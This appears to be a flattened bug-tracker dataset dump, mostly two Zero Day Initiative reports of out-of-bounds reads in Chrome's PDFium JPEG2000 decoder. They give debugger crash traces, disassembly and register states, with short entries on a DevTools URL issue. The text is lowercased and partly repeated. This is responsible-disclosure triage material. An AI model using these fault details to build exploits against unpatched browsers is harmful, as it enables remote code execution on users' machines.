b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\pi.c 1878 007fce34 5de505dd 085e8ff8 00000001 08312cb0 chrome_child opj_t2_decode_packets fpo non-fpo conv cdecl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\t2.c 447 007fce64 5e192e6a 00000000 08446ff8 00000003 chrome_child opj_tcd_decode_tile fpo non-fpo conv cdecl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\tcd.c 1294 007fce94 5e6d54f5 057d4f28 00000002 08442c18 chrome_child opj_j2k_decode_tile fpo non-fpo conv cdecl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\j2k.c 8069 007fcee8 5f082988 057d4f28 04f1afb8 077d0fd4 chrome_child opj_j2k_decode_tiles fpo non-fpo conv cdecl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\j2k.c 9596 007fcf08 5db885e6 057d4f28 05444ff0 04f1afb8 chrome_child opj_j2k_exec fpo non-fpo conv cdecl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\j2k.c 7286 007fcf3c 5e374bbd 057d4f28 04f1afb8 08316fd8 chrome_child opj_j2k_decode fpo non-fpo conv cdecl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\j2k.c 9796 007fcf54 5e1f6269 077d0fa8 04f1afb8 08316fd8 chrome_child opj_decode fpo non-fpo conv cdecl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\openjpeg.c 415 007fefc0 5dee0533 07806e58 000001a8 02004ff8 chrome_child cjpx_decoder init fpo non-fpo conv thiscall c b\build\slave\win\build\src\third_party\pdfium\core\src\fxcodec\codec\fx_codec_jpx_opj.cpp 743 007fefd8 5e810c13 07806e58 000001a8 00000001 chrome_child ccodec_jpxmodule createdecoder fpo non-fpo conv thiscall c b\build\slave\win\build\src\third_party\pdfium\core\src\fxcodec\codec\fx_codec_jpx_opj.cpp 866 4:044 ub eip chrome_child opj_pi_next_cprl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\pi.c 541 5dc14884 8b471c mov eax dword ptr edi+1ch 5dc14887 0faf470c imul eax dword ptr edi+0ch 5dc1488b 03d0 add edx eax 5dc1488d 8b4708 mov eax dword ptr edi+8 5dc14890 0fafc1 imul eax ecx 5dc14893 33c9 xor ecx ecx 5dc14895 03d0 add edx eax 5dc14897 8b4704 mov eax dword ptr edi+4 4:044 ub eip l 20 chrome_child opj_pi_next_cprl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\pi.c 539 5dc14840 8b4df0 mov ecx dword ptr ebp-10h 5dc14843 8b87d8000000 mov eax dword ptr edi+0d8h 5dc14849 48 dec eax 5dc1484a 0345ec add eax dword ptr ebp-14h 5dc1484d 99 cdq 5dc1484e f77dec idiv eax dword ptr ebp-14h 5dc14851 0faf7108 imul esi dword ptr ecx+8 5dc14855 8b4dd0 mov ecx dword ptr ebp-30h 5dc14858 d3f8 sar eax cl 5dc1485a 03f0 add esi eax 5dc1485c 8b45e8 mov eax dword ptr ebp-18h 5dc1485f d3f8 sar eax cl 5dc14861 2bf0 sub esi eax 5dc14863 8b4740 mov eax dword ptr edi+40h 5dc14866 897720 mov dword ptr edi+20h esi 5dc14869 894724 mov dword ptr edi+24h eax 5dc1486c 8b4f24 mov ecx dword ptr edi+24h 5dc1486f 3b4f34 cmp ecx dword ptr edi+34h 5dc14872 7331 jae chrome_child opj_pi_next_cprl 5dc148a5 5dc14874 8b5720 mov edx dword ptr edi+20h 5dc14877 0faf5714 imul edx dword ptr edi+14h 5dc1487b 8b4718 mov eax dword ptr edi+18h 5dc1487e 0faf4710 imul eax dword ptr edi+10h 5dc14882 03d0 add edx eax 5dc14884 8b471c mov eax dword ptr edi+1ch 5dc14887 0faf470c imul eax dword ptr edi+0ch 5dc1488b 03d0 add edx eax 5dc1488d 8b4708 mov eax dword ptr edi+8 5dc14890 0fafc1 imul eax ecx 5dc14893 33c9 xor ecx ecx 5dc14895 03d0 add edx eax 5dc14897 8b4704 mov eax dword ptr edi+4 4:044 u chrome_child opj_pi_next_cprl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\pi.c 542 5dc1489a 66390c50 cmp word ptr eax+edx 2 cx 5dc1489e 7457 je chrome_child opj_pi_next_cprl 5dc148f7 5dc148a0 ff4724 inc dword ptr edi+24h 5dc148a3 ebc7 jmp chrome_child opj_pi_next_cprl 5dc1486c 5dc148a5 ff471c inc dword ptr edi+1ch 5dc148a8 e935feffff jmp chrome_child opj_pi_next_cprl 5dc146e2 5dc148ad 8bb7d8000000 mov esi dword ptr edi+0d8h 5dc148b3 8bc6 mov eax esi 4:044 u chrome_child opj_pi_next_cprl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\pi.c 509 5dc148b5 8b8fe0000000 mov ecx dword ptr edi+0e0h 5dc148bb 99 cdq 5dc148bc f7f9 idiv eax ecx 5dc148be 2bf2 sub esi edx 5dc148c0 03f1 add esi ecx 5dc148c2 89b7d8000000 mov dword ptr edi+0d8h esi 5dc148c8 e900feffff jmp chrome_child opj_pi_next_cprl 5dc146cd 5dc148cd 8bb7dc000000 mov esi dword ptr edi+0dch 4:044 u chrome_child opj_pi_next_cprl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\pi.c 508 5dc148d3 8bc6 mov eax esi 5dc148d5 8b8fe4000000 mov ecx dword ptr edi+0e4h 5dc148db 99 cdq 5dc148dc f7f9 idiv eax ecx 5dc148de 2bf2 sub esi edx 5dc148e0 03f1 add esi ecx 5dc148e2 33c9 xor ecx ecx 5dc148e4 89b7dc000000 mov dword ptr edi+0dch esi 4:044 r eax=0860cff8 ebx=085f4ff0 ecx=00000000 edx=00000004 esi=085eea90 edi=085eea90 eip=5dc1489a esp=007fcdb0 ebp=007fcdec iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 chrome_child opj_pi_next_cprl 5dc1489a 66390c50 cmp word ptr eax+edx 2 cx ds:0023:0860d000 5:072 lmvm chrome_child start end module name 58a70000 5b44c000 chrome_child private pdb symbols c code\symbols\chrome_child.dll.pdb\617ab0e830ef4246ae5f30e3006c16db1\chrome_child.dll.pdb loaded symbol image file c program files\google\chrome\application\47.0.2526.106\chrome_child.dll image path c program files\google\chrome\application\47.0.2526.106\chrome_child.dll image name chrome_child.dll timestamp thu dec 10 18:23:55 2015 566a33bb checksum 02889a7d imagesize 029dc000 file version 47.0.2526.106 product version 47.0.2526.106 file flags 0 mask 17 file os 4 unknown win32 file type 1.0 app file date 00000000.00000000 translations 0409.04b0 companyname google inc productname google chrome internalname chrome_dll originalfilename chrome.dll productversion 47.0.2526.106 fileversion 47.0.2526.106 filedescription google chrome legalcopyright copyright 2015 google inc all rights reserved credit this vulnerability was discovered by anonymous working with hp s zero day initiative further details if supporting files were contained with this report they are provided within a password protected zip file the password is the zdi candidate number in the form zdi-can-xxxx where xxxx is the id number please confirm receipt of this report we expect all vendors to remediate zdi vulnerabilities within 120 days of the reported date if you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue if the 120 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch please keep us updated regarding the status of this issue and feel free to contact us at any time zero day initiative zdi-disclosures hp.com the pgp key used for all zdi vendor communications is available from information about the zdi established by tippingpoint and acquired by hewlett-packard the zero day initiative zdi represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities the zdi is unique in how the acquired vulnerability information is used the zdi does not re-sell the vulnerability details or any exploit code instead upon notifying the affected product vendor the zdi provides its hp tippingpoint customers with zero day protection through its intrusion prevention technology explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available disclosure policy our vulnerability disclosure policy is available online at what is the expected behavior what went wrong zdi-can-3447 google chrome pdfium jpeg2000 out-of-bounds read remote code execution vulnerability cvss 6.8 av n/ac m/au n/c p/i p/a p abstract hp s zero day initiative has identified a vulnerability affecting the following products google chrome vulnerability details tested on win8.1 32 bit 47.0.2526.106 the bug seems to have been originated from this code index pi layno pi step_l pi resno pi step_r pi compno pi step_c pi precno pi step_p if pi include index pi include index 1 return opj_true 161c.14e4 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=0860cff8 ebx=085f4ff0 ecx=00000000 edx=00000004 esi=085eea90 edi=085eea90 eip=5dc1489a esp=007fcdb0 ebp=007fcdec iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 error symbol file could not be found defaulted to export symbols for c users\zdi\appdata\local\google\chrome sxs\application\49.0.2579.0\chrome_child.dll chrome_child crashforexception 5dc1489a 66390c50 cmp word ptr eax+edx 2 cx ds:0023:0860d000 4:044 dd eax 0860cff8 00010001 d0d0d0d0 0860d008 0860d018 0860d028 0860d038 0860d048 0860d058 0860d068 4:044 sympath srv c code\symbols symbol search path is srv c code\symbols expanded symbol search path is srv c code\symbols 4:044 reload reloading current modules 4:044 kvb childebp retaddr args to child 007fcdec 5dd9f97a 085eea90 007fce34 5de114c5 chrome_child opj_pi_next_cprl fpo non-fpo conv cdecl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\pi.c 542 007fcdf8 5de114c5 085eea90 085e8ff8 0830efd0 chrome_child opj_pi_next fpo non-fpo conv cdecl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\pi.c 1878 007fce34 5de505dd 085e8ff8 00000001 08312cb0 chrome_child opj_t2_decode_packets fpo non-fpo conv cdecl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\t2.c 447 007fce64 5e192e6a 00000000 08446ff8 00000003 chrome_child opj_tcd_decode_tile fpo non-fpo conv cdecl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\tcd.c 1294 007fce94 5e6d54f5 057d4f28 00000002 08442c18 chrome_child opj_j2k_decode_tile fpo non-fpo conv cdecl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\j2k.c 8069 007fcee8 5f082988 057d4f28 04f1afb8 077d0fd4 chrome_child opj_j2k_decode_tiles fpo non-fpo conv cdecl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\j2k.c 9596 007fcf08 5db885e6 057d4f28 05444ff0 04f1afb8 chrome_child opj_j2k_exec fpo non-fpo conv cdecl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\j2k.c 7286 007fcf3c 5e374bbd 057d4f28 04f1afb8 08316fd8 chrome_child opj_j2k_decode fpo non-fpo conv cdecl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\j2k.c 9796 007fcf54 5e1f6269 077d0fa8 04f1afb8 08316fd8 chrome_child opj_decode fpo non-fpo conv cdecl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\openjpeg.c 415 007fefc0 5dee0533 07806e58 000001a8 02004ff8 chrome_child cjpx_decoder init fpo non-fpo conv thiscall c b\build\slave\win\build\src\third_party\pdfium\core\src\fxcodec\codec\fx_codec_jpx_opj.cpp 743 007fefd8 5e810c13 07806e58 000001a8 00000001 chrome_child ccodec_jpxmodule createdecoder fpo non-fpo conv thiscall c b\build\slave\win\build\src\third_party\pdfium\core\src\fxcodec\codec\fx_codec_jpx_opj.cpp 866 4:044 ub eip chrome_child opj_pi_next_cprl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\pi.c 541 5dc14884 8b471c mov eax dword ptr edi+1ch 5dc14887 0faf470c imul eax dword ptr edi+0ch 5dc1488b 03d0 add edx eax 5dc1488d 8b4708 mov eax dword ptr edi+8 5dc14890 0fafc1 imul eax ecx 5dc14893 33c9 xor ecx ecx 5dc14895 03d0 add edx eax 5dc14897 8b4704 mov eax dword ptr edi+4 4:044 ub eip l 20 chrome_child opj_pi_next_cprl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\pi.c 539 5dc14840 8b4df0 mov ecx dword ptr ebp-10h 5dc14843 8b87d8000000 mov eax dword ptr edi+0d8h 5dc14849 48 dec eax 5dc1484a 0345ec add eax dword ptr ebp-14h 5dc1484d 99 cdq 5dc1484e f77dec idiv eax dword ptr ebp-14h 5dc14851 0faf7108 imul esi dword ptr ecx+8 5dc14855 8b4dd0 mov ecx dword ptr ebp-30h 5dc14858 d3f8 sar eax cl 5dc1485a 03f0 add esi eax 5dc1485c 8b45e8 mov eax dword ptr ebp-18h 5dc1485f d3f8 sar eax cl 5dc14861 2bf0 sub esi eax 5dc14863 8b4740 mov eax dword ptr edi+40h 5dc14866 897720 mov dword ptr edi+20h esi 5dc14869 894724 mov dword ptr edi+24h eax 5dc1486c 8b4f24 mov ecx dword ptr edi+24h 5dc1486f 3b4f34 cmp ecx dword ptr edi+34h 5dc14872 7331 jae chrome_child opj_pi_next_cprl 5dc148a5 5dc14874 8b5720 mov edx dword ptr edi+20h 5dc14877 0faf5714 imul edx dword ptr edi+14h 5dc1487b 8b4718 mov eax dword ptr edi+18h 5dc1487e 0faf4710 imul eax dword ptr edi+10h 5dc14882 03d0 add edx eax 5dc14884 8b471c mov eax dword ptr edi+1ch 5dc14887 0faf470c imul eax dword ptr edi+0ch 5dc1488b 03d0 add edx eax 5dc1488d 8b4708 mov eax dword ptr edi+8 5dc14890 0fafc1 imul eax ecx 5dc14893 33c9 xor ecx ecx 5dc14895 03d0 add edx eax 5dc14897 8b4704 mov eax dword ptr edi+4 4:044 u chrome_child opj_pi_next_cprl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\pi.c 542 5dc1489a 66390c50 cmp word ptr eax+edx 2 cx 5dc1489e 7457 je chrome_child opj_pi_next_cprl 5dc148f7 5dc148a0 ff4724 inc dword ptr edi+24h 5dc148a3 ebc7 jmp chrome_child opj_pi_next_cprl 5dc1486c 5dc148a5 ff471c inc dword ptr edi+1ch 5dc148a8 e935feffff jmp chrome_child opj_pi_next_cprl 5dc146e2 5dc148ad 8bb7d8000000 mov esi dword ptr edi+0d8h 5dc148b3 8bc6 mov eax esi 4:044 u chrome_child opj_pi_next_cprl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\pi.c 509 5dc148b5 8b8fe0000000 mov ecx dword ptr edi+0e0h 5dc148bb 99 cdq 5dc148bc f7f9 idiv eax ecx 5dc148be 2bf2 sub esi edx 5dc148c0 03f1 add esi ecx 5dc148c2 89b7d8000000 mov dword ptr edi+0d8h esi 5dc148c8 e900feffff jmp chrome_child opj_pi_next_cprl 5dc146cd 5dc148cd 8bb7dc000000 mov esi dword ptr edi+0dch 4:044 u chrome_child opj_pi_next_cprl c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\pi.c 508 5dc148d3 8bc6 mov eax esi 5dc148d5 8b8fe4000000 mov ecx dword ptr edi+0e4h 5dc148db 99 cdq 5dc148dc f7f9 idiv eax ecx 5dc148de 2bf2 sub esi edx 5dc148e0 03f1 add esi ecx 5dc148e2 33c9 xor ecx ecx 5dc148e4 89b7dc000000 mov dword ptr edi+0dch esi 4:044 r eax=0860cff8 ebx=085f4ff0 ecx=00000000 edx=00000004 esi=085eea90 edi=085eea90 eip=5dc1489a esp=007fcdb0 ebp=007fcdec iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 chrome_child opj_pi_next_cprl 5dc1489a 66390c50 cmp word ptr eax+edx 2 cx ds:0023:0860d000 5:072 lmvm chrome_child start end module name 58a70000 5b44c000 chrome_child private pdb symbols c code\symbols\chrome_child.dll.pdb\617ab0e830ef4246ae5f30e3006c16db1\chrome_child.dll.pdb loaded symbol image file c program files\google\chrome\application\47.0.2526.106\chrome_child.dll image path c program files\google\chrome\application\47.0.2526.106\chrome_child.dll image name chrome_child.dll timestamp thu dec 10 18:23:55 2015 566a33bb checksum 02889a7d imagesize 029dc000 file version 47.0.2526.106 product version 47.0.2526.106 file flags 0 mask 17 file os 4 unknown win32 file type 1.0 app file date 00000000.00000000 translations 0409.04b0 companyname google inc productname google chrome internalname chrome_dll originalfilename chrome.dll productversion 47.0.2526.106 fileversion 47.0.2526.106 filedescription google chrome legalcopyright copyright 2015 google inc all rights reserved credit this vulnerability was discovered by anonymous working with hp s zero day initiative further details if supporting files were contained with this report they are provided within a password protected zip file the password is the zdi candidate number in the form zdi-can-xxxx where xxxx is the id number please confirm receipt of this report we expect all vendors to remediate zdi vulnerabilities within 120 days of the reported date if you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue if the 120 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch please keep us updated regarding the status of this issue and feel free to contact us at any time zero day initiative zdi-disclosures hp.com the pgp key used for all zdi vendor communications is available from information about the zdi established by tippingpoint and acquired by hewlett-packard the zero day initiative zdi represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities the zdi is unique in how the acquired vulnerability information is used the zdi does not re-sell the vulnerability details or any exploit code instead upon notifying the affected product vendor the zdi provides its hp tippingpoint customers with zero day protection through its intrusion prevention technology explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available disclosure policy our vulnerability disclosure policy is available online at did this work before n/a chrome version 47.0.2526.106 channel stable os version 8.1 47.0.2526.106 flash version	7
security devtools loads any url with remotebase parameter devtools seems to accept http urls in its remotebase parameter this allows a network attacker code execution in devtools	9
tracking bug for internal fixes chrome m48 release 2 high	9
zdi-can-3432 new vulnerability report useragent mozilla/5.0 macintosh intel mac os x 10_10_5 applewebkit/537.36 khtml like gecko chrome/47.0.2526.106 safari/537.36 steps to reproduce the problem zdi-can-3432 google chrome pdfium jpeg2000 out-of-bounds read remote code execution vulnerability cvss 6.8 av n/ac m/au n/c p/i p/a p abstract hp s zero day initiative has identified a vulnerability affecting the following products google chrome vulnerability details tested on win8.1/32 bit and chrome 47.0.2526.106 162c.1270 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=00000001 ebx=08908000 ecx=00000000 edx=0da2cf18 esi=08904e94 edi=00000000 eip=5ef8e48e esp=0037ce74 ebp=0037ceb0 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 chrome_child opj_t2_read_packet_header 5ef8e48e ff7320 push dword ptr ebx+20h ds:0023:08908020 2:036 ub eip l20 chrome_child opj_t2_read_packet_header c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\t2.c 855 5ef8e435 8b4508 mov eax dword ptr ebp+8 5ef8e438 8b5514 mov edx dword ptr ebp+14h 5ef8e43b 53 push ebx 5ef8e43c 56 push esi 5ef8e43d 8b4004 mov eax dword ptr eax+4 5ef8e440 6b4a1834 imul ecx dword ptr edx+18h 34h 5ef8e444 695a1c88000000 imul ebx dword ptr edx+1ch 88h 5ef8e44b 8b751c mov esi dword ptr ebp+1ch 5ef8e44e 8945d8 mov dword ptr ebp-28h eax 5ef8e451 8b450c mov eax dword ptr ebp+0ch 5ef8e454 57 push edi 5ef8e455 8bfe mov edi esi 5ef8e457 897dfc mov dword ptr ebp-4 edi 5ef8e45a 8b4014 mov eax dword ptr eax+14h 5ef8e45d 897de4 mov dword ptr ebp-1ch edi 5ef8e460 035c0118 add ebx dword ptr ecx+eax+18h 5ef8e464 33c0 xor eax eax 5ef8e466 895ddc mov dword ptr ebp-24h ebx 5ef8e469 394224 cmp dword ptr edx+24h eax 5ef8e46c 7564 jne chrome_child opj_t2_read_packet_header 5ef8e4d2 5ef8e46e 8d731c lea esi ebx+1ch 5ef8e471 394318 cmp dword ptr ebx+18h eax 5ef8e474 765a jbe chrome_child opj_t2_read_packet_header 5ef8e4d0 5ef8e476 8bf8 mov edi eax 5ef8e478 6b5a2028 imul ebx dword ptr edx+20h 28h 5ef8e47c 8b4608 mov eax dword ptr esi+8 5ef8e47f 035e14 add ebx dword ptr esi+14h 5ef8e482 2b06 sub eax dword ptr esi 5ef8e484 743b je chrome_child opj_t2_read_packet_header 5ef8e4c1 5ef8e486 8b460c mov eax dword ptr esi+0ch 5ef8e489 2b4604 sub eax dword ptr esi+4 5ef8e48c 7433 je chrome_child opj_t2_read_packet_header 5ef8e4c1 2:036 u eip l 20 chrome_child opj_t2_read_packet_header c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\t2.c 874 5ef8e48e ff7320 push dword ptr ebx+20h 5ef8e491 e8a8e0ffff call chrome_child opj_tgt_reset 5ef8c53e 5ef8e496 ff7324 push dword ptr ebx+24h 5ef8e499 e8a0e0ffff call chrome_child opj_tgt_reset 5ef8c53e 5ef8e49e 8b4314 mov eax dword ptr ebx+14h 5ef8e4a1 0faf4310 imul eax dword ptr ebx+10h 5ef8e4a5 59 pop ecx 5ef8e4a6 59 pop ecx 5ef8e4a7 8b4b18 mov ecx dword ptr ebx+18h 5ef8e4aa 85c0 test eax eax 5ef8e4ac 7410 je chrome_child opj_t2_read_packet_header 5ef8e4be 5ef8e4ae 83c130 add ecx,30h 5ef8e4b1 8361fc00 and dword ptr ecx-4 0 5ef8e4b5 832100 and dword ptr ecx 0 5ef8e4b8 8d4938 lea ecx ecx+38h 5ef8e4bb 48 dec eax 5ef8e4bc 75f3 jne chrome_child opj_t2_read_packet_header 5ef8e4b1 5ef8e4be 8b5514 mov edx dword ptr ebp+14h 5ef8e4c1 8b45dc mov eax dword ptr ebp-24h 5ef8e4c4 83c624 add esi,24h 5ef8e4c7 47 inc edi 5ef8e4c8 3b7818 cmp edi dword ptr eax+18h 5ef8e4cb 72ab jb chrome_child opj_t2_read_packet_header 5ef8e478 5ef8e4cd 8b7dfc mov edi dword ptr ebp-4 5ef8e4d0 8bf7 mov esi edi 5ef8e4d2 8b4510 mov eax dword ptr ebp+10h 5ef8e4d5 f60002 test byte ptr eax 2 5ef8e4d8 7435 je chrome_child opj_t2_read_packet_header 5ef8e50f 5ef8e4da 837d2406 cmp dword ptr ebp+24h 6 5ef8e4de 7307 jae chrome_child opj_t2_read_packet_header 5ef8e4e7 5ef8e4e0 68482fb75f push offset chrome_child string 5fb72f48 5ef8e4e5 eb1b jmp chrome_child opj_t2_read_packet_header 5ef8e502 2:036 r eax=00000001 ebx=08908000 ecx=00000000 edx=0da2cf18 esi=08904e94 edi=00000000 eip=5ef8e48e esp=0037ce74 ebp=0037ceb0 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 chrome_child opj_t2_read_packet_header 5ef8e48e ff7320 push dword ptr ebx+20h ds:0023:08908020 2:036 heap p a eb 2:036 heap p a ebx address 08908000 found in dph_heap_root 3b1000 in busy allocation dph_heap_block useraddr usersize virtaddr virtsize 87337b8 8907fd8 28 8907000 2000 6e6794ec verifier avrfdebugpageheapallocate 77c00dab ntdll rtldebugallocateheap 77bc1b4d ntdll rtlpallocateheap 77b5acde ntdll rtlallocateheap 5d8c1a0d chrome_child anonymous namespace win_heap_malloc 5d8c19e4 chrome_child malloc 5ef8aa52 chrome_child opj_tcd_init_decode_tile 5ef86059 chrome_child opj_j2k_read_tile_header 5ef8420d chrome_child opj_j2k_decode_tiles 5ef8480c chrome_child opj_j2k_exec 5ef83cb8 chrome_child opj_j2k_decode 5ef87cfc chrome_child opj_jp2_decode 5ef80e66 chrome_child opj_decode 5ef48590 chrome_child cjpx_decoder init 5ef4807b chrome_child ccodec_jpxmodule createdecoder 5ef37bc9 chrome_child cpdf_dibsource loadjpxbitmap 5ef363f4 chrome_child cpdf_dibsource createdecoder 5ef38598 chrome_child cpdf_dibsource startloaddibsource 5ef25158 chrome_child cpdf_imagecache startgetcachedbitmap 5ef251e1 chrome_child cpdf_pagerendercache startgetcachedbitmap 5ef383cb chrome_child cpdf_progressiveimageloaderhandle start 5ef386c4 chrome_child cpdf_imageloader startloadimage 5ef28cf2 chrome_child cpdf_imagerenderer startloaddibsource 5ef28792 chrome_child cpdf_imagerenderer start 5ef00b76 chrome_child cpdf_renderstatus continuesingleobject 5ef00a25 chrome_child cpdf_progressiverenderer continue 5eedd026 chrome_child fpdf_renderpage_retail 5eedf0ba chrome_child fpdf_renderpagebitmap_start 5e6f6834 chrome_child chrome_pdf pdfiumengine continuepaint 5e6fa786 chrome_child chrome_pdf pdfiumengine paint 5e700dc2 chrome_child chrome_pdf outofprocessinstance onpaint 5e705ae5 chrome_child paintmanager dopaint 2:036 lmvm chrome start end module name 011d0000 0129b000 chrome deferred image path chrome.exe image name chrome.exe timestamp fri nov 06 18:27:45 2015 563d61a1 checksum 000ce1db imagesize 000cb000 file version 46.0.2490.86 product version 46.0.2490.86 file flags 0 mask 17 file os 4 unknown win32 file type 1.0 app file date 00000000.00000000 translations 0409.04b0 companyname google inc productname google chrome internalname chrome_exe originalfilename chrome.exe productversion 46.0.2490.86 fileversion 46.0.2490.86 filedescription google chrome legalcopyright copyright 2015 google inc all rights reserved 2:036 lmvm chrome_child start end module name 5d8c0000 60193000 chrome_child private pdb symbols c code\symbols\chrome_child.dll.pdb\001f93f5fae74515bd40868fb342758e1\chrome_child.dll.pdb loaded symbol image file c program files\google\chrome\application\46.0.2490.86\chrome_child.dll image path c program files\google\chrome\application\46.0.2490.86\chrome_child.dll image name chrome_child.dll timestamp fri nov 06 18:26:08 2015 563d6140 checksum 0277c91a imagesize 028d3000 file version 46.0.2490.86 product version 46.0.2490.86 file flags 0 mask 17 file os 4 unknown win32 file type 1.0 app file date 00000000.00000000 translations 0409.04b0 companyname google inc productname google chrome internalname chrome_dll originalfilename chrome.dll productversion 46.0.2490.86 fileversion 46.0.2490.86 filedescription google chrome legalcopyright copyright 2015 google inc all rights reserved credit this vulnerability was discovered by anonymous working with hp s zero day initiative further details if supporting files were contained with this report they are provided within a password protected zip file the password is the zdi candidate number in the form zdi-can-xxxx where xxxx is the id number please confirm receipt of this report we expect all vendors to remediate zdi vulnerabilities within 120 days of the reported date if you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue if the 120 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch please keep us updated regarding the status of this issue and feel free to contact us at any time zero day initiative zdi-disclosures hp.com the pgp key used for all zdi vendor communications is available from information about the zdi established by tippingpoint and acquired by hewlett-packard the zero day initiative zdi represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities the zdi is unique in how the acquired vulnerability information is used the zdi does not re-sell the vulnerability details or any exploit code instead upon notifying the affected product vendor the zdi provides its hp tippingpoint customers with zero day protection through its intrusion prevention technology explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available disclosure policy our vulnerability disclosure policy is available online at what is the expected behavior what went wrong zdi-can-3432 google chrome pdfium jpeg2000 out-of-bounds read remote code execution vulnerability cvss 6.8 av n/ac m/au n/c p/i p/a p abstract hp s zero day initiative has identified a vulnerability affecting the following products google chrome vulnerability details tested on win8.1/32 bit and chrome 47.0.2526.106 162c.1270 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=00000001 ebx=08908000 ecx=00000000 edx=0da2cf18 esi=08904e94 edi=00000000 eip=5ef8e48e esp=0037ce74 ebp=0037ceb0 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 chrome_child opj_t2_read_packet_header 5ef8e48e ff7320 push dword ptr ebx+20h ds:0023:08908020 2:036 ub eip l20 chrome_child opj_t2_read_packet_header c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\t2.c 855 5ef8e435 8b4508 mov eax dword ptr ebp+8 5ef8e438 8b5514 mov edx dword ptr ebp+14h 5ef8e43b 53 push ebx 5ef8e43c 56 push esi 5ef8e43d 8b4004 mov eax dword ptr eax+4 5ef8e440 6b4a1834 imul ecx dword ptr edx+18h 34h 5ef8e444 695a1c88000000 imul ebx dword ptr edx+1ch 88h 5ef8e44b 8b751c mov esi dword ptr ebp+1ch 5ef8e44e 8945d8 mov dword ptr ebp-28h eax 5ef8e451 8b450c mov eax dword ptr ebp+0ch 5ef8e454 57 push edi 5ef8e455 8bfe mov edi esi 5ef8e457 897dfc mov dword ptr ebp-4 edi 5ef8e45a 8b4014 mov eax dword ptr eax+14h 5ef8e45d 897de4 mov dword ptr ebp-1ch edi 5ef8e460 035c0118 add ebx dword ptr ecx+eax+18h 5ef8e464 33c0 xor eax eax 5ef8e466 895ddc mov dword ptr ebp-24h ebx 5ef8e469 394224 cmp dword ptr edx+24h eax 5ef8e46c 7564 jne chrome_child opj_t2_read_packet_header 5ef8e4d2 5ef8e46e 8d731c lea esi ebx+1ch 5ef8e471 394318 cmp dword ptr ebx+18h eax 5ef8e474 765a jbe chrome_child opj_t2_read_packet_header 5ef8e4d0 5ef8e476 8bf8 mov edi eax 5ef8e478 6b5a2028 imul ebx dword ptr edx+20h 28h 5ef8e47c 8b4608 mov eax dword ptr esi+8 5ef8e47f 035e14 add ebx dword ptr esi+14h 5ef8e482 2b06 sub eax dword ptr esi 5ef8e484 743b je chrome_child opj_t2_read_packet_header 5ef8e4c1 5ef8e486 8b460c mov eax dword ptr esi+0ch 5ef8e489 2b4604 sub eax dword ptr esi+4 5ef8e48c 7433 je chrome_child opj_t2_read_packet_header 5ef8e4c1 2:036 u eip l 20 chrome_child opj_t2_read_packet_header c b\build\slave\win\build\src\third_party\pdfium\third_party\libopenjpeg20\t2.c 874 5ef8e48e ff7320 push dword ptr ebx+20h 5ef8e491 e8a8e0ffff 